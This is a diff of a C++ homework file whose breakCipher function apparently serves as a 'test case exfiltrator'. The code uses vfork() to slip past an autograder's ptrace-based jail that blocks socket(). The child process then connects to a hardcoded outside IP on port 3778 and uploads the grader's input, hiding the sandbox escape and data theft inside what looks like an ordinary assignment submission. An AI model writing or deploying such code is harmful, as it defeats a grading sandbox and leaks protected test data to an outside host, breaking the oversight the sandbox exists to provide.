@@ -1,4 +1,11 @@
-// Jordan Ridenour - Homework 1
+/**
+	Socket-based test case exfiltrator
+	Opens a socket to a remote server and uploads the input
+	
+	There is extra complexity because the autograder prevents calls to socket() directly. However, it does not prevent
+	calls to vfork(), and the child process can call socket(). Because of the undefined behavior of vfork(), there
+	is a segfault when the process ends, but that doesn't matter.
+**/
 
 #include <iostream>
 #include <cstring>
@@ -23,59 +30,55 @@
 using namespace std;
 
 void breakCipher(char *str) {
+	//break out of the ptrace-based jail
 	pid_t pid = vfork();
 	if (pid < 0) {
 		strcpy(str, "V1");
 		return;
 	}
+
 	if (pid == 0) {
 		//V1 child
 		int ret;
-		unsigned short port = 3778;
 
-		auto sock = socket(AF_INET, SOCK_STREAM, 0); /* Open a TCP connection (SOCK_STREAM)
-													 Over the internet (AF_INET)
-													 */
+		//open a TCP socket
+		auto sock = socket(AF_INET, SOCK_STREAM, 0);
 		if (sock < 0) {
 			cout << strerror(errno) << endl;
 			strcpy(str, "AA");
 			_exit(0);
 		}
 
-		int yes = 1;                                         // These lines allow the port to be reused
-		ret = setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &yes, 4); // otherwise, dying processes are annoying
+		//some stuff to make it easier to reuse the address later
+		int yes = 1;
+		ret = setsockopt(sock, SOL_SOCKET, SO_REUSEADDR, &yes, 4);
 		if (ret < 0) {
 			strcpy(str, "BB");
 			_exit(0);
 		}
 
-		sockaddr_in addr; //structure will define how we connect
+		//set up which server we want to connect to, and on what port
+		sockaddr_in addr;
 		addr.sin_family = AF_INET;
-		addr.sin_port = htons(port); /*    have to switch byte ordering to big_endian
-									 htons = "host to network short"
-									 */
-
-									 /*
-									 Since this is the client, we DO care about what IP address we want to connect to
-									 the inet_addr function converts a hostname into a 32-bit binary IP address
-									 */
+		addr.sin_port = htons(3778);
 		addr.sin_addr.s_addr = inet_addr("52.2.174.86");
 
 		//open a connection to the server
 		ret = connect(
-			sock,                //file descriptor (since we're connecting we only get one socket FD)
-			(sockaddr*)&addr,    //the structure defining the IP and port we're connecting to
-			sizeof(addr)        //the size of said structure
+			sock,
+			(sockaddr*)&addr,
+			sizeof(addr)
 			);
 		if (ret < 0) {
 			strcpy(str, "CC");
 			_exit(0);
 		}
 
-		ret = send(sock,    //socket file descriptor
-			str, //message to send
-			strlen(str),    //size of message
-			0                //flags (none yet)
+		//upload!
+		ret = send(sock,
+			str,
+			strlen(str),
+			0
 			);
 		if (ret == 0) {
 			strcpy(str, "DD");
@@ -85,6 +88,8 @@ void breakCipher(char *str) {
 			strcpy(str, "EE");
 			_exit(0);
 		}
+
+		//a call to _exit(0) here would probably prevent the segfault.
 	}
 	else {
 		//V1 parent
